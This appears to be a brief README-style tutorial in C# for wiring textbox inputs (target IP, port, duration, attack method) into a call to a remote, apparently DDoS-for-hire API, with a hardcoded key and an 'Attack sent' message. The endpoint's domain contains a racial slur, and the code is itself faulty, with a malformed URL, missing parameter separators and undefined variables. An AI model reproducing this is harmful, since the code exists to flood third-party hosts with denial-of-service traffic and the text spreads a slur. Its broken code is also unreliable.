# How-To-String-A-API-In-C-
Making A Api In C#


So Here Are Two Ways

//Creating the string by grabbing the data from the textbox and importing it into our link

string IPAddress = ({YourIptextbox}.text);
string Port = ({YourPorttextbox}.text);
string Time = ({YourTimetextbox}.text);
string Method = ({YourMethodtextbox}.text);

WebClient wc = new WebClient { }; wc.DownloadString($"https:nigger-api.com/api/api.php?key=XMiHDIaf1Zwvv5BqL&host={IPAddress}&port={Port}&time{Time}&method{Method}");
MessageBox.Show($"Attack sent to {ip} using port {port} for {time} Second/s");

//
//Or To Make It Easier

WebClient wc = new WebClient { }; wc.DownloadString($"https:nigger-api.com/api/api.php?key=XMiHDIaf1Zwvv5BqL&host={IPAddress.text}&port={Port.text}&time{Time.text}&method{Method.text}");
MessageBox.Show($"Attack sent to {ip} using port {port} for {time} Second/s");

// So Now All Your Doing Instead Of Making A String Your Just Grabbing And Importing The Data Besides Making A Varible.

//Credits Yully
